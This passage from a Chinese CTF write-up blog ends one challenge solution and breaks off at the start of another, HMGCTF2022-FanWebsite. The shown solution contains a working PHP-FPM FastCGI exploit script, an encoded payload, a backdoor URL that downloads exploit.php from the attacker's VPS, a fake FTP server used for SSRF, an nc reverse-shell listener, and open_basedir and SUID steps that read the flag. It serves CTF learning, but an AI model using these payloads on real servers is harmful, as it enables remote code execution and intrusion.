            <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$len</span>  <span class="token operator">=</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'contentLength'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$len</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token variable">$len</span> <span class="token operator">-=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$buf</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token variable">$buf</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$buf</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'paddingLength'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token variable">$resp</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getValues</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$requestedInfo</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$requestedInfo</span> <span class="token keyword">as</span> <span class="token variable">$info</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_sock</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$resp</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">readPacket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">GET_VALUES_RESULT</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment">/**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token comment">//        $this-&gt;connect();</span>
        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=&gt;</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 输出payload</span>
<span class="token comment">//        fwrite($this-&gt;_sock, $request);</span>
<span class="token comment">//        do {</span>
<span class="token comment">//            $resp = $this-&gt;readPacket();</span>
<span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {</span>
<span class="token comment">//                $response .= $resp['content'];</span>
<span class="token comment">//            }</span>
<span class="token comment">//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span>
<span class="token comment">//        var_dump($resp);</span>
<span class="token comment">//        if (!is_array($resp)) {</span>
<span class="token comment">//            throw new Exception('Bad request');</span>
<span class="token comment">//        }</span>
<span class="token comment">//        switch (ord($resp['content']{4})) {</span>
<span class="token comment">//            case self::CANT_MPX_CONN:</span>
<span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::OVERLOADED:</span>
<span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::UNKNOWN_ROLE:</span>
<span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span>
<span class="token comment">//                break;</span>
<span class="token comment">//            case self::REQUEST_COMPLETE:</span>
<span class="token comment">//                return $response;</span>
<span class="token comment">//        }</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter important">?&gt;</span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// real exploit start here</span>
<span class="token comment">//if (!isset($_REQUEST['cmd'])) {</span>
<span class="token comment">//    die("Check your input\n");</span>
<span class="token comment">//}</span>
<span class="token comment">//if (!isset($_REQUEST['filepath'])) {</span>
<span class="token comment">//    $filepath = __FILE__;</span>
<span class="token comment">//}else{</span>
<span class="token comment">//    $filepath = $_REQUEST['filepath'];</span>
<span class="token comment">//}</span>

<span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>
<span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span>
<span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?&gt;"</span><span class="token punctuation">;</span> 
<span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /var/www/html\nextension = 1.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span>   <span class="token comment">//修改这里的so文件名称和路径</span>
<span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=&gt;</span> <span class="token variable">$filepath</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=&gt;</span> <span class="token variable">$req</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=&gt;</span> <span class="token variable">$uri</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=&gt;</span> <span class="token variable">$req</span><span class="token punctuation">,</span>
<span class="token comment">#'DOCUMENT_ROOT'     =&gt; '/',</span>
    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=&gt;</span> <span class="token variable">$php_value</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span>    <span class="token comment">// 注意这里的FPM端口</span>
    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=&gt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// print_r($_REQUEST);</span>
<span class="token comment">// print_r($params);</span>
<span class="token comment">//echo "Call: $uri\n\n";</span>
<span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-&gt;</span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将上面代码保存为<code>exploit.php</code>，写入网站<code>/var/www/html/</code>目录，也可以用<code>file_put_contents</code>，IP修改为自己vps地址</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(copy('http://[IP]/exploit.php','/var/www/html/exploit.php'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后访问<code>/exploit.php</code>，得到payload（这里也可以本地运行生成payload，PHP版本对应好就行）</p>
<pre class="line-numbers language-none"><code class="language-none">data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后在VPS开启FTP服务</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
s<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
conn<span class="token punctuation">,</span> addr <span class="token operator">=</span> s<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'220 welcome\n'</span><span class="token punctuation">)</span>
<span class="token comment">#Service ready for new user.</span>
<span class="token comment">#Client send anonymous username</span>
<span class="token comment">#USER anonymous</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'331 Please specify the password.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#User name okay, need password.</span>
<span class="token comment">#Client send anonymous password.</span>
<span class="token comment">#PASS anonymous</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'230 Login successful.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#User logged in, proceed. Logged out if appropriate.</span>
<span class="token comment">#TYPE I</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'200 Switching to Binary mode.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#Size /</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'550 Could not get the file size.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#EPSV (1)</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 ok\n'</span><span class="token punctuation">)</span>
<span class="token comment">#PASV</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'227 Entering Extended Passive Mode (127,0,0,1,0,9001)\n'</span><span class="token punctuation">)</span> <span class="token comment">#注意打到9001端口</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'150 Permission denied.\n'</span><span class="token punctuation">)</span>
<span class="token comment">#QUIT</span>
conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'221 Goodbye.\n'</span><span class="token punctuation">)</span>
conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>拼接payload如下，IP修改为自己vps地址，开启监听<code>nc -lvnp 9898</code>（这里监听端口和<code>.so</code>文件反弹shell的端口对应），然后执行payload</p>
<pre class="line-numbers language-none"><code class="language-none">/add_api.php?backdoor=phpinfo();file_put_contents($_GET[%27file%27],$_GET[%27data%27]);&amp;file=ftp://test@[IP]:9999/&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02B%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B6PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Fvar%2Fwww%2Fhtml%0Aextension+%3D+1.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>获取到www-data权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921162625519.png"></p>
<p>执行如下命令，找有suid权限的文件，发现<code>/usr/local/bin/php</code>有suid权限</p>
<pre class="line-numbers language-none"><code class="language-none">find / -perm -u=s -type f 2&gt;/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行如下命令获取flag</p>
<pre class="line-numbers language-none"><code class="language-none">php -a mkdir('wa0er');chdir('wa0er');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('/flag'));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230921163407442.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/yesec/p/15211484.html">https://www.cnblogs.com/yesec/p/15211484.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>基础反序列化</tag>
        <tag>PHP数组key溢出</tag>
        <tag>open_basedir绕过</tag>
        <tag>SSRF攻击FPM服务</tag>
        <tag>被动FTP</tag>
        <tag>SUID权限</tag>
      </tags>
  </entry>
  <entry>
    <title>HMGCTF2022-FanWebsite</title>
    <url>/posts/15d824d9.html</url>
    <content><![CDATA[<h1 id="HMGCTF2022-FanWebsite"><a href="#HMGCTF2022-FanWebsite" class="headerlink" title="HMGCTF2022-FanWebsite"></a>HMGCTF2022-FanWebsite</h1><p>知识点概要：phar反序列化、文件上传</p>
<p>题目首页</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814111657747.png"></p>
<p><a href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230814140604382.png"></p>
<p>主页面标题是Laminas MVC Skeleton，说明是Laminas MVC架构的框架</p>
<p>MVC框架先看路由，在<code>www/module/Album/src/Controller/AlbumController.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Album<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>

<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>AlbumTable</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Laminas<span class="token punctuation">\</span>Mvc<span class="token punctuation">\</span>Controller<span class="token punctuation">\</span>AbstractActionController</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Laminas<span class="token punctuation">\</span>View<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>ViewModel</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Form<span class="token punctuation">\</span>AlbumForm</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Form<span class="token punctuation">\</span>UploadForm</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Album<span class="token punctuation">\</span>Model<span class="token punctuation">\</span>Album</span><span class="token punctuation">;</span>

